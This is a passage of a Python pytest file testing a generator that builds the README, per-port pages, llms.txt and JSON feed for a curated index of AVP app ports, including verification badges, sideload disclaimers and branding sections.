    assert "| Prebuilt app |" not in out["ports/good.md"] and "prebuilt app (not security-reviewed)" not in out["README.md"]
    assert "plays as 3D shared space, 6DoF immersive" in out["llms.txt"]
    entry = json.loads(out["feed/v1/index.json"])["entries"][0]
    assert entry["experiences"] == ["3d-shared-space", "6dof-immersive"] and entry["install"] == ["build"]
    write_entry(rt.root, "good", "trevorbilt-bot/good", experiences=["2d"], install=["build", "sideload"])
    out = generate.generate(rt.root, rt.repo)
    assert "| Prebuilt app | The developer also publishes an app you can sideload; see their repo." in out["ports/good.md"]
    assert "· prebuilt app (not security-reviewed)" in out["README.md"] and "didn't security-review" in out["llms.txt"]
    feed = json.loads(out["feed/v1/index.json"])
    assert feed["schema_version"] == "1.2.0" and feed["entries"][0]["install"] == ["build", "sideload"]


def test_surfaces_and_brand(rt, gh):
    repo = gh.add_repo("trevorbilt-bot/good", 11)
    list_entry(rt, "good", repo)
    state = store.State.load(rt.root)
    state.verified = {"schema_version": 1, "records": {"good": {"verified": True, "verified_on": "2026-10-10",
                                                                "verified_commit": SHA(1), "repo_id": 11}}}
    (rt.root / store.VERIFIED).write_text(yaml.safe_dump(state.verified))
    out = generate.generate(rt.root, rt.repo)
    readme = out["README.md"]
    assert "✔ Verified by trevorbilt on 2026-10-10 (repo updated since)" in readme
    assert f"blob/{SHA(11)}/AVP-INSTALL.md" in readme and f"git checkout {SHA(11)}" in out["ports/good.md"]
    assert "Curated by trevorbilt" in out["ports/good.md"]
    assert out["llms.txt"].startswith("# AVP Ports Index\n") and "1 port listed" in out["llms.txt"]
    more = readme.index("## More from Trevorbilt")
    assert readme.index("## Reports and takedowns") < more < readme.index(generate.brand_lines(store.load_brand(rt.root))["footer"])
    assert "[Loose Papers](https://trevorbilt.com/loose-papers)" in readme and "More from" not in out["llms.txt"]
    assert "More from" not in out["feed/v1/index.json"] and "Developer site" not in out["ports/good.md"]
    write_entry(rt.root, "good", "trevorbilt-bot/good", developer={"github": "trevorbilt-bot", "url": "https://example.com/dev"})
    assert "| Developer site | <https://example.com/dev> |" in generate.generate(rt.root, rt.repo)["ports/good.md"]
    brand = (rt.root / "brand/brand.yaml").read_text()
    assert '<img src="https://trevorbilt.com/' in readme  # the hosted logo
    (rt.root / "brand/brand.yaml").write_text(brand.replace("logo: https://trevorbilt.com/assets/logo-BdrEikAq.png", "logo: brand/missing.svg"))
    assert 'alt="Trevorbilt"' not in generate.generate(rt.root, rt.repo)["README.md"]  # a repo path renders only if it exists
    with pytest.raises(generate.BrandError):
        generate.assert_brand(dict(out, **{"README.md": "no brand"}), generate.build_model(rt.root, rt.repo))
    assert APP_ID and BOT_ID
